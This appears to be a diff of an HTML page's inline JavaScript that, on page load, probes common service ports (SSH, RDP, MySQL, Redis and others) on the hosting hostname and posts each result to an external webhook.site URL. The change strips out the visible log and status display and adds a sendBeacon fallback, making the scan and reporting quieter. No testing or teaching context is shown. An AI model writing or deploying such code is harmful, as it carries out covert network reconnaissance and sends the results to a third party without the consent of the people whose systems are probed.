@@ -29,86 +29,48 @@
 
     <script>
         const webhookUrl = 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94';
-        const commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5984, 8080, 8443, 27017, 6379, 9200];
-
-        function addLog(message, type = 'info') {
-            const timestamp = new Date().toLocaleTimeString();
-            const entry = `[${timestamp}] ${message}`;
-            
-            const logDiv = document.getElementById('log');
-            const entryEl = document.createElement('div');
-            entryEl.className = `entry ${type}`;
-            entryEl.textContent = entry;
-            logDiv.appendChild(entryEl);
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
-
+        
         async function sendToWebhook(data) {
             try {
-                const payload = {
-                    timestamp: new Date().toISOString(),
-                    scanType: 'port_scan',
-                    data: data
-                };
-                
-                const response = await fetch(webhookUrl, {
+                await fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(data)
                 });
-
-                addLog(`📨 Webhook Response: ${response.status} ${response.statusText}`, 'webhook');
-            } catch (error) {
-                addLog(`❌ Webhook Failed: ${error.message}`, 'closed');
+            } catch {
+                navigator.sendBeacon(webhookUrl, JSON.stringify(data));
             }
         }
-
-        async function runScan() {
-            const hostname = window.location.hostname || 'localhost';
-            document.getElementById('target').textContent = hostname;
-            addLog(`🎯 Target: ${hostname}`, 'info');
-            addLog(`📊 Scanning ${commonPorts.length} ports...`, 'info');
-            
-            let openPorts = [];
-            let results = {};
-
-            for (const port of commonPorts) {
+        
+        async function scanPorts() {
+            const hostname = window.location.hostname || "localhost";
+            const ports =  [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5984, 8080, 8443, 27017, 6379, 9200];
+        
+            for (const port of ports) {
+                let result = {
+                    type: "port_scan",
+                    host: hostname,
+                    port: port,
+                    status: "UNKNOWN"
+                };
+        
                 try {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 1500);
-                    
-                    const response = await fetch(`http://${hostname}:${port}`, {
-                        method: 'HEAD',
-                        signal: controller.signal
-                    }).catch(() => null);
-                    
-                    clearTimeout(timeoutId);
-                    
-                    if (response) {
-                        openPorts.push(port);
-                        results[port] = 'OPEN';
-                        addLog(`✅ Port ${port} OPEN`, 'open');
-                    } else {
-                        results[port] = 'CLOSED';
-                    }
-                } catch (error) {
-                    results[port] = 'CLOSED';
+                    const res = await fetch(`http://${hostname}:${port}`, {
+                        method: 'HEAD'
+                    });
+        
+                    result.status = "RESPONSE";
+                    result.httpStatus = res.status;
+                } catch (e) {
+                    result.error = e.message;
                 }
+        
+                console.log(result);
+                await sendToWebhook(result);
             }
-
-            addLog(`\n🏁 Found ${openPorts.length} open ports`, 'info');
-            
-            await sendToWebhook({
-                hostname: hostname,
-                openPorts: openPorts,
-                totalScanned: commonPorts.length,
-                closedPorts: commonPorts.length - openPorts.length
-            });
-
-            document.getElementById('status').textContent = 'Complete ✅';
         }
-
-        window.addEventListener('load', runScan);
-    </script>
+        
+        window.onload = scanPorts;
+</script>
 </body>
 </html>
